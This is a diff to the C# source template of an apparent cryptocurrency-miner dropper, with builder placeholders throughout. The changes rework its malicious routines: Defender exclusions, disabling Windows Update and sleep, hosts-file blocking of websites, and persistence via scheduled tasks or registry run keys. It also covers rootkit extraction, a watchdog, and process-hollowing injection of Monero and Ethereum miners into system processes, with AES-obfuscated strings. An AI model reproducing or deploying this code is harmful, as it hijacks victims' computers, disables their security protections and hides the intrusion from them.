@@ -31,16 +31,16 @@ public partial class _rProgram_
             {
 #if DefWDExclusions
             
-                _rCommand_(_rGetString_("#SCMD"), _rGetString_("#DefenderCommands"), true);
+                _rCommand_("#SPOWERSHELL", "#WDCOMMANDS", true);
 #endif
 #if DefStartDelay
                 Thread.Sleep(startDelay * 1000);
 #endif
 #if DefDisableWindowsUpdate
-                _rCommand_(_rGetString_("#SCMD"), _rGetString_("#WUPDATE"));
+                _rCommand_("#SCMD", "#WUPDATE");
 #endif
 #if DefDisableSleep
-                _rCommand_(_rGetString_("#SCMD"), _rGetString_("#POWERCFG"));
+                _rCommand_("#SCMD", "#POWERCFG");
 #endif
             }
             catch (Exception ex)
@@ -52,17 +52,17 @@ public partial class _rProgram_
 #if DefBlockWebsites
             try
             {
-                string _rhostspath_ = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), _rGetString_("#HOSTSPATH"));
+                string _rhostspath_ = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "#HOSTSPATH");
                 string _rhostscontent_ = File.ReadAllText(_rhostspath_);
 
                 string[] _rdomainset_ = new string[] { DOMAINSET };
-                using (StreamWriter w = File.AppendText(_rhostspath_))
+                using (StreamWriter _rw_ = File.AppendText(_rhostspath_))
                 {
                     foreach (string _set_ in _rdomainset_)
                     {
                         if (!_rhostscontent_.Contains(" " + _set_))
                         {
-                            w.Write(string.Format(_rGetString_("#HOSTSFORMAT"), _set_));
+                            _rw_.Write(string.Format("#HOSTSFORMAT", _set_));
                         }
                     }
                 }
@@ -74,8 +74,8 @@ public partial class _rProgram_
 #endif
             }
 #endif
-            string _rbD_ = Path.Combine(Environment.GetFolderPath($LIBSROOT), _rGetString_("#LIBSPATH"));
-            string _rbD2_ = Path.Combine(Environment.GetFolderPath($LIBSROOT), _rGetString_("#WATCHDOGPATH"));
+            string _rbD_ = Path.Combine(Environment.GetFolderPath($LIBSROOT), "#LIBSPATH");
+            string _rbD2_ = Path.Combine(Environment.GetFolderPath($LIBSROOT), "#WATCHDOGPATH");
 #if DefInstall
             try
             {
@@ -87,16 +87,17 @@ public partial class _rProgram_
 #endif
                 if (!_rcmdl_.Equals(_rplp_, StringComparison.CurrentCultureIgnoreCase))
                 {
+                    string _rpayloadcommand_ = $PAYLOADCOMMAND;
 #if DefNoMinerOverwrite
                     if(File.Exists(_rplp_)){
-                        _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#CMDSTART"), _rplp_));
+                        _rCommand_("#SPOWERSHELL", _rpayloadcommand_);
                         Environment.Exit(0);
                     }
 #endif
 #if DefRootkit
                     try
                     {
-                        _rRun_(_rExtractFile_(_rGetTheResource_("#RESRKI"), "st"), Path.Combine(Directory.GetParent(Environment.SystemDirectory).FullName, _rGetString_("#CONHOST")), null);                  
+                        _rRun_(_rExtractFile_(_rGetTheResource_("#RESRKI"), "st"), Path.Combine(Directory.GetParent(Environment.SystemDirectory).FullName, "#CONHOST"), null);                  
                     }
                     catch(Exception ex){
 #if DefDebug
@@ -107,19 +108,29 @@ public partial class _rProgram_
                     _rFindWatchdog_(true);
 
                     try{
+                        Directory.CreateDirectory(Path.GetDirectoryName(_rplp_));                       
                         if(new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                         {
-                            try{
-                                _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#TASKSCHADD"), _rplp_));
+                            if (Environment.OSVersion.Version < new Version(6, 2))
+                            {
+                                _rCommand_("#SCMD", string.Format("#WIN7TASKSCHADD", _rplp_));
+                                File.Copy(_rcmdl_, _rplp_, true);
+                                _rCommand_("#SCMD", "#WIN7TASKSCHSTART");
                             }
-                            catch(Exception ex){
-#if DefDebug
-                                MessageBox.Show("MTSA: " + Environment.NewLine + ex.ToString());
+                            else
+                            {
+                                _rCommand_("#SPOWERSHELL", string.Format("#ECTEMPLATE", Convert.ToBase64String(Encoding.Unicode.GetBytes(string.Format("#TASKSCHADD", _rplp_.Replace("'", "''"), _rcmdl_.Replace("'", "''"), _rpayloadcommand_)))), true);
+                            }
+                        }
+                        else
+                        {
+                            _rCommand_("#SCMD", string.Format("#REGADD", _rplp_));
+                            Thread.Sleep(2000);
+                            File.Copy(_rcmdl_, _rplp_, true);
+                            Thread.Sleep(2000);
+#if DefRunInstall
+                            _rCommand_("#SPOWERSHELL", _rpayloadcommand_);
 #endif
-                                _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#REGADD"), _rplp_));
-                            }
-                        }else{
-                            _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#REGADD"), _rplp_));
                         }
                     }
                     catch(Exception ex){
@@ -127,24 +138,8 @@ public partial class _rProgram_
                         MessageBox.Show("MAE: " + ex.ToString());
 #endif
                     }
-
-                    Thread.Sleep(5000);
-                    Directory.CreateDirectory(Path.GetDirectoryName(_rplp_));
-                    File.Copy(_rcmdl_, _rplp_, true);
-                    Thread.Sleep(2000);
-#if DefRunInstall
-                    if(new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
-                    {
-                        _rCommand_(_rGetString_("#SCMD"), _rGetString_("#TASKSCHSTART"));
-                        
-                    }
-                    else
-                    {
-                        _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#CMDSTART"), _rplp_));
-                    }
-#endif
 #if DefAutoDelete
-                    _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#CMDDELETE"), _rcmdl_));
+                    _rCommand_("#SCMD", string.Format("#CMDDELETE", _rcmdl_));
 #endif
                     Environment.Exit(0);
                 }
@@ -166,13 +161,13 @@ public partial class _rProgram_
                     if (!_rFindWatchdog_())
                     {
 #if DefMemoryWatchdog
-                        _rRun_(_rGetTheResource_("#RESWD"), Path.Combine(Directory.GetParent(Environment.SystemDirectory).FullName, _rGetString_("#CONHOST")), null);
+                        _rRun_(_rGetTheResource_("#RESWD"), Path.Combine(Directory.GetParent(Environment.SystemDirectory).FullName, "#CONHOST"), "#WATCHDOGID", true);
 #else
-                        File.WriteAllBytes(Path.Combine(_rbD2_, _rGetString_("#WATCHDOGNAME") + ".exe"), _rGetTheResource_("#RESWD"));
+                        File.WriteAllBytes(Path.Combine(_rbD2_, "#WATCHDOGNAME" + ".exe"), _rGetTheResource_("#RESWD"));
 
                         Process.Start(new ProcessStartInfo
                         {
-                            FileName = Path.Combine(_rbD2_, _rGetString_("#WATCHDOGNAME") + ".exe"),
+                            FileName = Path.Combine(_rbD2_, "#WATCHDOGNAME" + ".exe"),
                             WorkingDirectory = _rbD2_,
                             WindowStyle = ProcessWindowStyle.Hidden,
                             CreateNoWindow = true
@@ -181,7 +176,7 @@ public partial class _rProgram_
                     }
 #endif
 #if DefXMR
-                    File.WriteAllBytes(Path.Combine(_rbD_, "WR64.sys"), _rGetTheResource_("#RESWR"));
+                    File.WriteAllBytes(Path.Combine(_rbD_, "#WR64"), _rGetTheResource_("#RESWR"));
 #endif
                 }
                 catch (Exception ex)
@@ -237,9 +232,9 @@ public partial class _rProgram_
 
                     foreach (string[] _set_ in _rminerset_)
                     {
-                        if (!_rrunningminers_.Contains(_rGetString_(_set_[0])) && (_set_[1] == _rGetString_("#XID") || (_set_[1] == _rGetString_("#EID") && _rGPU_)))
+                        if (!_rrunningminers_.Contains(_rGetString_(_set_[0])) && (_set_[1] == "#XID" || (_set_[1] == "#EID" && _rGPU_)))
                         {
-                            _rRun_((_set_[1] == _rGetString_("#XID") ? _rxmr_ : _reth_), Path.Combine(Directory.GetParent(Environment.SystemDirectory).FullName, _rGetString_(_set_[3])), _rGetString_(_set_[2]));
+                            _rRun_((_set_[1] == "#XID" ? _rxmr_ : _reth_), Path.Combine(Directory.GetParent(Environment.SystemDirectory).FullName, _rGetString_(_set_[3])), _rGetString_(_set_[2]));
                         }
                     }
 
@@ -275,7 +270,7 @@ public partial class _rProgram_
 
     public static string _rGetString_(string _rarg1_)
     {
-        return Encoding.UTF8.GetString(_rAESMethod_(Convert.FromBase64String(_rarg1_)));
+        return Encoding.Unicode.GetString(_rAESMethod_(Convert.FromBase64String(_rarg1_)));
     }
 
     public static bool _rGetGPU_()
@@ -286,16 +281,16 @@ public partial class _rProgram_
 
             var _rarg4_ = new ConnectionOptions();
             _rarg4_.Impersonation = ImpersonationLevel.Impersonate;
-            var _rarg5_ = new ManagementScope(_rGetString_("#WMISCOPE"), _rarg4_);
+            var _rarg5_ = new ManagementScope("#WMISCOPE", _rarg4_);
             _rarg5_.Connect();
 
-            var rarg6 = new ManagementObjectSearcher(_rarg5_, new ObjectQuery(_rGetString_("#GPUQUERY"))).Get();
+            var rarg6 = new ManagementObjectSearcher(_rarg5_, new ObjectQuery("#GPUQUERY")).Get();
             foreach (ManagementObject MemObj in rarg6)
             {
                 _rarg7_ += (" " + MemObj["VideoProcessor"] + " " + MemObj["Name"]);
             }
 
-            return _rarg7_.IndexOf(_rGetString_("#STRNVIDIA"), StringComparison.OrdinalIgnoreCase) >= 0 || _rarg7_.IndexOf(_rGetString_("#STRAMD"), StringComparison.OrdinalIgnoreCase) >= 0;
+            return _rarg7_.IndexOf("#STRNVIDIA", StringComparison.OrdinalIgnoreCase) >= 0 || _rarg7_.IndexOf("#STRAMD", StringComparison.OrdinalIgnoreCase) >= 0;
         }
         catch (Exception ex)
         {
@@ -312,13 +307,13 @@ public partial class _rProgram_
 
         var _rarg1_ = new ConnectionOptions();
         _rarg1_.Impersonation = ImpersonationLevel.Impersonate;
-        var _rarg2_ = new ManagementScope(_rGetString_("#WMISCOPE"), _rarg1_);
+        var _rarg2_ = new ManagementScope("#WMISCOPE", _rarg1_);
         _rarg2_.Connect();
 
-        var _rarg3_ = new ManagementObjectSearcher(_rarg2_, new ObjectQuery(_rGetString_("#MINERQUERY"))).Get();
+        var _rarg3_ = new ManagementObjectSearcher(_rarg2_, new ObjectQuery("#MINERQUERY")).Get();
         foreach (ManagementObject MemObj in _rarg3_)
         {
-            if (MemObj != null && MemObj["CommandLine"] != null && MemObj["CommandLine"].ToString().Contains(_rGetString_("#MINERID")))
+            if (MemObj != null && MemObj["CommandLine"] != null && MemObj["CommandLine"].ToString().Contains("#MINERID"))
             {
                 _rminers_ += MemObj["CommandLine"].ToString();
             }
@@ -331,23 +326,23 @@ public partial class _rProgram_
 #if DefWatchdog
         try
         {
-            foreach (Process proc in Process.GetProcessesByName(_rGetString_("#WATCHDOGNAME")))
+            foreach (Process proc in Process.GetProcessesByName("#WATCHDOGNAME"))
             {
                 proc.Kill();
             }
 
             var _rarg1_ = new ConnectionOptions();
             _rarg1_.Impersonation = ImpersonationLevel.Impersonate;
-            var _rarg2_ = new ManagementScope(_rGetString_("#WMISCOPE"), _rarg1_);
+            var _rarg2_ = new ManagementScope("#WMISCOPE", _rarg1_);
             _rarg2_.Connect();
 
             var _rarg3_ = new ManagementObjectSearcher(_rarg2_, new ObjectQuery("Select CommandLine, ProcessID from Win32_Process")).Get();
             foreach (ManagementObject MemObj in _rarg3_)
             {
-                if (MemObj != null && MemObj["CommandLine"] != null && MemObj["CommandLine"].ToString().Contains(_rGetString_("#WATCHDOGID")))
+                if (MemObj != null && MemObj["CommandLine"] != null && MemObj["CommandLine"].ToString().Contains("#WATCHDOGID"))
                 {
                     if(_rkill_){
-                        _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#CMDKILL"), MemObj["ProcessID"]));
+                        _rCommand_("#SCMD", string.Format("#CMDKILL", MemObj["ProcessID"]));
                     }else{
                         return true;
                     }
@@ -420,24 +415,34 @@ public partial class _rProgram_
         return new byte[] { };
     }
 
-    public static void _rRun_(byte[] _rpayload_, string _rinjectionpath_, string _rarguments_)
+    public static void _rRun_(byte[] _rpayload_, string _rinjectionpath_, string _rarguments_, bool _rshellcode_ = false)
     {
-        Assembly.Load(_rGetTheResource_("#RESRPE")).GetType(_rGetString_("#RUNPETYPE")).GetMethod(_rGetString_("#RUNPEMETHOD"), BindingFlags.Public | BindingFlags.Static).Invoke(null, new object[] { _rpayload_, _rinjectionpath_, _rarguments_ });
+        try
+        {
+            Assembly.Load(_rGetTheResource_("#RESRPE")).GetType("#RUNPETYPE").GetMethod(_rshellcode_ ? "#SHELLCODEMETHOD" : "#RUNPEMETHOD", BindingFlags.Public | BindingFlags.Static).Invoke(null, new object[] { _rpayload_, _rinjectionpath_, _rarguments_ });
+        }
+        catch (Exception ex)
+        {
+#if DefDebug
+            MessageBox.Show("RPE: " + ex.ToString());
+#endif
+        }
     }
 
-    public static byte[] _rAESMethod_(byte[] _rarg1_, bool _rarg2_ = false)
+    public static byte[] _rAESMethod_(byte[] _rinput_, bool _rencrypt_ = false)
     {
-        var _rarg4_ = new Rfc2898DeriveBytes("#KEY", Encoding.ASCII.GetBytes("#SALT"), 100);
-        var _rarg5_ = new RijndaelManaged() { KeySize = 256, Mode = CipherMode.CBC };
-        var _rarg6_ = _rarg2_ ? _rarg5_.CreateEncryptor(_rarg4_.GetBytes(16), Encoding.ASCII.GetBytes("#IV")) : _rarg5_.CreateDecryptor(_rarg4_.GetBytes(16), Encoding.ASCII.GetBytes("#IV"));
-        using (var _rarg7_ = new MemoryStream())
+        var _rkeybytes_ = new Rfc2898DeriveBytes(@"#AESKEY", Encoding.ASCII.GetBytes(@"#SALT"), 100).GetBytes(16);
+        using (Aes _raesAlg_ = Aes.Create())
         {
-            using (var _rarg8_ = new CryptoStream(_rarg7_, _rarg6_, CryptoStreamMode.Write))
+            using (MemoryStream _rmsDecrypt_ = new MemoryStream())
             {
-                _rarg8_.Write(_rarg1_, 0, _rarg1_.Length);
-                _rarg8_.Close();
+                using (CryptoStream _rcsDecrypt_ = new CryptoStream(_rmsDecrypt_, _rencrypt_ ? _raesAlg_.CreateEncryptor(_rkeybytes_, Encoding.ASCII.GetBytes(@"#IV")) : _raesAlg_.CreateDecryptor(_rkeybytes_, Encoding.ASCII.GetBytes(@"#IV")), CryptoStreamMode.Write))
+                {
+                    _rcsDecrypt_.Write(_rinput_, 0, _rinput_.Length);
+                    _rcsDecrypt_.Close();
+                }
+                return _rmsDecrypt_.ToArray();
             }
-            return _rarg7_.ToArray();
         }
     }
 }
